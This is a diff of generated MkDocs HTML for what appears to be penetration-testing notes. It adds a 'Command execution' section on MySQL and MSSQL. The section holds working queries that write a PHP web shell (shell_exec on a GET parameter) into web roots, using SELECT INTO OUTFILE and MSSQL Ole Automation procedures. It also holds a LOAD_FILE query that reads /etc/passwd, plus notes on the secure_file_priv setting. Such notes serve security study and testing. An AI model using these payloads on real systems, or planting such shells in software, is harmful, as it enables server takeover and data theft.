@@ -7661,6 +7661,54 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#command-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Command execution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Command execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#writing-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Writing files
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reading-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reading files
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reading files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mysql-read-local-files-in-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL - Read Local Files in MySQL
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -11600,6 +11648,54 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#command-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Command execution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Command execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#writing-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Writing files
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reading-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reading files
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reading files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mysql-read-local-files-in-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL - Read Local Files in MySQL
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -11717,10 +11813,62 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1"># Show current database</span>
 </span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="k">database</span><span class="p">()</span>
 </span></code></pre></div>
+<h2 id="command-execution">Command execution</h2>
+<h3 id="writing-files">Writing files</h3>
+<p><code>MySQL</code> supports <a href="https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/">User Defined Functions</a> which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this <a href="https://github.com/mysqludf/lib_mysqludf_sys">GitHub repository</a>.</p>
+<p><code>MySQL</code> does not have a stored procedure like <code>xp_cmdshell</code>, but we can achieve command execution if we write to a location in the file system that can execute our commands. </p>
+<ul>
+<li>If <code>MySQL</code> operates on a PHP-based web server or other programming languages like ASP.NET, having  the appropriate privileges, attempt to write a file using <a href="https://mariadb.com/kb/en/select-into-outfile/">SELECT INTO OUTFILE</a> in the webserver directory. </li>
+<li>Browse to the location where the file is and execute the commands.</li>
+</ul>
+<div class="language-mysql highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s2">&quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="k">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/html/webshell.php&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<ul>
+<li>In <code>MySQL</code>, a global system variable <a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv">secure_file_priv</a> limits the effect of data import and export operations, such as those performed by the <code>LOAD DATA</code> and <code>SELECT … INTO OUTFILE</code> statements and the <a href="https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file">LOAD_FILE()</a> function. These operations are permitted only to users who have the <a href="https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file">FILE</a> privilege.</li>
+<li>Settings in the <code>secure_file_priv</code>:<ul>
+<li>
+<p>If empty, the variable has no effect, which is not a secure setting as we can read and write data using <code>MySQL</code>:</p>
+<div class="language-mysql highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">show</span><span class="w"> </span><span class="k">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s2">&quot;secure_file_priv&quot;</span><span class="p">;</span>
+</span></code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="go">+------------------+-------+</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="go">| Variable_name    | Value |</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="go">+------------------+-------+</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="go">| secure_file_priv |       |</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="go">+------------------+-------+</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a># To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>sp_configure &#39;show advanced options&#39;, 1;
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>RECONFIGURE;
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>sp_configure &#39;Ole Automation Procedures&#39;, 1;
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>RECONFIGURE;
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a># Using MSSQL to Create a File
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>DECLARE @OLE INT;
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>DECLARE @FileID INT;
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>EXECUTE sp_OACreate &#39;Scripting.FileSystemObject&#39;, @OLE OUT;
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>EXECUTE sp_OAMethod @OLE, &#39;OpenTextFile&#39;, @FileID OUT, &#39;c:\inetpub\wwwroot\webshell.php&#39;, 8, 1;
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>EXECUTE sp_OAMethod @FileID, &#39;WriteLine&#39;, Null, &#39;&lt;?php echo shell_exec($_GET[&quot;c&quot;]);?&gt;&#39;;
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>EXECUTE sp_OADestroy @FileID;
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>EXECUTE sp_OADestroy @OLE;
+</span></code></pre></div>
+<ul>
+<li>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.</li>
+<li>If set to NULL, the server disables import and export operations.</li>
+</ul>
+<h3 id="reading-files">Reading files</h3>
+<h4 id="mysql-read-local-files-in-mysql">MySQL - Read Local Files in MySQL</h4>
+<p>If permissions allows it:</p>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="go">select LOAD_FILE(&quot;/etc/passwd&quot;);</span>
+</span></code></pre></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2023-11-27T18:22:15+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-11-27</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2023-12-04T21:50:34+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-12-04</span></small></br>
 
 
     <small>Created: January 1, 2023 21:59:36</small>
